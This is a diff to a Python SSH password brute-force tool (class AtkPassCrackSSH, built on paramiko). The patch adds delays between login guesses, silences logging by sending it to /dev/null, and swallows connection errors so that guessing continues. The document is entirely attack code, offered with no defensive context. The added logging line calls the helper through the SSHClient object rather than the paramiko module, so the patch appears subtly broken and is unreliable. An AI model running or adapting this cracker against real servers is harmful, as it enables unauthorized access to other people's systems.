@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # coding: UTF-8
 import os
+import time
 import base64
 import paramiko
 
@@ -38,6 +39,7 @@ class AtkPassCrackSSH(object):
             self.logger("Trying user: " + user + ", pwd: " + pwd, "+")
             try:
                 ssh = paramiko.SSHClient()
+                ssh.util.log_to_file("/dev/null", level="INFO")
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 ssh.connect(self.host, username=user, password=pwd, port=self.port, auth_timeout=1)
                 try:
@@ -45,7 +47,12 @@ class AtkPassCrackSSH(object):
                     transport.send_ignore()
                 except EOFError as e:
                     # connection is closed
-                    print(e)
+                    #print(e)
+                    time.sleep(0.2)
+                    continue
+                except Exception as e:
+                    #print(e)
+                    time.sleep(0.2)
                     continue
                     
                 ssh.close()
@@ -54,6 +61,7 @@ class AtkPassCrackSSH(object):
             except Exception as e:
                 #print(e)
                 #self.logger("May be Auth failed?", "!")
+                time.sleep(0.2)
                 continue
 
                 
